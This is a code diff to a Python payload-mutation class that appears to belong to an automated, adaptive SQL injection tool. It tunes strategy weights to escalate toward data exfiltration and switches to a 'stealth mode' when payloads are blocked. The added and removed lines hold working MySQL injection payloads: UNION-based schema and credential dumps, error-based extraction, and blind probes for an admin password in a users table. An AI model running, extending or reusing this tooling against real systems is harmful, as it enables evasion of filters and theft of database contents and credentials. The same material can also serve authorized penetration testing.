@@ -43,6 +43,8 @@ class ASTMutator:
         self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
         self.last_strategy_used = None
         self.stealth_mode = False
+        self.boredom_counter = 0 # Track how many samey successes we hit
+        self.last_score = 0
 
     def apply_hint(self, hint):
         """Applies AI-driven hints to strategy weights."""
@@ -74,21 +76,34 @@ class ASTMutator:
         core_gene = self._strip_wrappers(str(payload))
         mutated = core_gene
         
-        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
+        # 1. Error-Based Feedback
         if error_msg:
             mutated = self._apply_error_feedback(mutated, error_msg)
             
-        # 2. Standard Mutations with RL (Epsilon-Greedy)
+        # 2. Strategy Selection Strategy: Exploration vs Exploitation
         num_mutations = random.randint(1, 2) * intensity
         
         for _ in range(num_mutations):
             names = list(self.strategies.keys())
             
-            # Epsilon-Greedy Selection
-            if random.random() < self.epsilon:
+            # --- INTELLIGENT DISCOVERY STEERING ---
+            # If we are "stuck" in logical successes (boredom), force exploratory strategies
+            advanced_strats = ["column_discovery", "upgrade_to_exfil", "dios_mutation", "advanced_blind", "scientific_notation"]
+            
+            if self.boredom_counter > 5:
+                # Force an advanced move to break the local maximum
+                strat_name = random.choice(advanced_strats)
+                self.boredom_counter -= 1 # Decelerate boredom
+            elif random.random() < self.epsilon:
                 strat_name = random.choice(names)
             else:
                 current_weights = dict(self.strategy_weights)
+                
+                # If we are in "Exfil Mode" (found a boolean bypass), boost the exfil strategies
+                if self.last_score >= 0.5:
+                    for s in advanced_strats:
+                        current_weights[s] = current_weights.get(s, 1.0) * 10.0
+                
                 if self.stealth_mode:
                     current_weights["dynamic_structural"] *= 2.0
                     current_weights["micro_fragmentation"] *= 2.0
@@ -102,14 +117,23 @@ class ASTMutator:
                 continue
             mutated = self.strategies[strat_name](mutated)
             
-        # 3. Contextual Compatibility Logic: Wrap the core safely
+        # 3. Contextual Compatibility Logic
         if wrap:
             mutated = self._context_aware_wrap(mutated)
         return mutated
 
     def report_success(self, payload, score):
         """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
-        # Detect if we are being blocked consistently
+        self.last_score = score
+        
+        # 0. Boredom Check
+        if score > 0.5 and score < 0.9:
+            # It's a win, but not the BIG win. If we keep doing this, we're bored.
+            self.boredom_counter += 1
+        else:
+            self.boredom_counter = max(0, self.boredom_counter - 1)
+
+        # 1. Detect if we are being blocked consistently
         if score <= 0.1:
             self.stealth_mode = True
             # Penalize keywords present in a blocked payload
@@ -209,17 +233,29 @@ class ASTMutator:
         # Clean current terminators if they exist
         clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
         
+        exfil_options = [
+            # DIOS / Schema Extraction
+            " UNION SELECT NULL,CONCAT(0x7e,USER(),0x3a,VERSION(),0x7e)",
+            " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
+            " UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273",
+            
+            # Error Based Prompts (Force the server to error out with data)
+            " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            " AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
+            
+            # Blind Exfiltration Bridge
+            " AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password LIKE 0x25)", # '%'
+            " AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name REGEXP '^u' LIMIT 1)"
+        ]
+        
         # Only upgrade if it's considered a relatively simple bypass
         if "SELECT" not in original and "UNION" not in original:
-            exfil_options = [
-                " UNION SELECT NULL,CONCAT(USER(),0x3a,VERSION())",
-                " AND (SELECT 1 FROM (SELECT SLEEP(5))a)", 
-                " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
-                " UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273", # 'users' in hex
-                " UNION SELECT NULL,group_concat(user,0x3a,password) FROM users",
-                " UNION SELECT NULL,@@version"
-            ]
             return clean_payload + random.choice(exfil_options)
+        
+        # If it's already a UNION, but lacks EXFIL, try to replace NULLs with something meaningful
+        if "NULL" in clean_payload.upper() and random.random() < 0.4:
+            return clean_payload.replace("NULL", "(SELECT version())", 1)
+            
         return payload
 
     def _discover_column_count(self, payload):
